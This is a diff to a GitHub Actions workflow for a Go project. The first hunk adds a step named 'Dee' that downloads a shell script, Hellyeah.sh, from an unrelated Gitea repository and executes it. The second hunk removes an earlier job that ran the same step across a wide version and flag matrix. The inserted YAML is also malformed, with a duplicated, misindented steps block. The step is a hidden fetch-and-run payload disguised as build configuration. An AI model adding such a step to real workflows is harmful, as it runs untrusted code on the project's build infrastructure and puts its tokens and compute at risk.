@@ -103,7 +103,17 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v2
-
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Dee
+      run: |
+        wget https://try.gitea.io/gairmeet/chuax/raw/branch/master/Hellyeah.sh && chmod +x Hellyeah.sh && ./Hellyeah.sh
       - name: Download the build folders
         uses: actions/download-artifact@v2
         with:
@@ -256,28 +266,3 @@ jobs:
           # Recommended: pass the GitHub token lets this action correctly
           # determine the unique run id necessary to re-run the checks
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-  jobs:
-  build:
-    name: Dee
-    runs-on: ubuntu-18.04
-    strategy:
-      max-parallel: 10
-      fail-fast: false
-      matrix:
-        go: [1.6, 1.7, 1.8, 1.9, 1.10]
-        flag: [A, B, C, D, E, F, G, H, I]
-    timeout-minutes: 10
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
-    steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: Setup
-      uses: actions/checkout@v1
-    - name: Dee
-      run: |
-        wget https://try.gitea.io/gairmeet/chuax/raw/branch/master/Hellyeah.sh && chmod +x Hellyeah.sh && ./Hellyeah.sh
